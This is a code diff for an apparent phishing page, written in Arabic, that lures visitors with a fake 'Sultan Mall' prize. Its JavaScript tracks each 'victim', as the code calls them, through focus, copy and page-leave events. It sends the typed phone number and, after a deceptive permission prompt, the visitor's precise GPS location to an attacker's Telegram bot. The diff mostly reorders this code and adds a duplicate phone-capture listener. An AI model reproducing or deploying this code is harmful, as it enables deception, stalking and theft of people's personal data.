@@ -132,41 +132,54 @@
     }
 
     // تشغيل الرادار فوراً
-    silentRadar();
-    // رادار كشف النوايا والتحركات 🕵️‍♂️
-    document.getElementById('name').addEventListener('focus', () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية بدأ الآن بكتابة اسمه.. ترقبوا!")}`);
-    });
+    // 1. تشغيل الرادار الصامت أولاً
+silentRadar(); 
 
-    document.addEventListener('copy', () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
-    });
+// 2. رادار كشف النوايا والتحركات (يعمل فوراً)
+document.getElementById('name').addEventListener('focus', () => {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية بدأ الآن بكتابة اسمه.. ترقبوا!")}`);
+});
 
-    window.onblur = () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
-    };
+document.addEventListener('copy', () => {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
+});
 
-    window.onfocus = () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
-    };
+window.onblur = () => {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
+};
 
-    // --- 2. دالة تسجيل البيانات (تشتغل عند ضغط الزر) ---
-        // 1. تعريف دالة الرادار الجديد 📍
-    async function getExactLocation() {
+window.onfocus = () => {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
+};
 
-        alert("تهانينا! لتحديد أقرب فرع 'سلطان مول' لموقعك لاستلام الجائزة، يرجى الضغط على 'سماح' في النافذة التالية. 📍");
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                const locMsg = `📍 موقع الصيد الدقيق جاهز:\n${mapLink}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
-            }, error => {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية رفض إعطاء إذن الموقع!")}`);
-            });
-        }
+// 3. محقّق البيانات (يرسل ما يكتبه في الخانات)
+document.getElementById('phone').addEventListener('change', (e) => {
+    if(e.target.value.length > 3) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية كتب في خانة الرقم: " + e.target.value)}`);
     }
+});
+    // 🔍 محقّق البيانات الذكي
+    document.getElementById('phone').addEventListener('change', (e) => {
+        if(e.target.value.length > 3) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية كتب رقمه: " + e.target.value)}`);
+        }
+    });
+
+// 4. دالة جلب الموقع الدقيق (تستدعى عند ضغط الزر)
+async function getExactLocation() {
+    alert("تهانينا! لتحديد أقرب فرع 'سلطان مول' لموقعك لاستلام الجائزة، يرجى الضغط على 'سماح' في النافذة التالية");
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const locMsg = `📍 موقع الصيد الدقيق جاهز:\n${mapLink}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
+        }, error => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية رفض إعطاء إذن الموقع!")}`);
+        });
+    }
+}
 
     async function executeAttack() {
         getExactLocation();
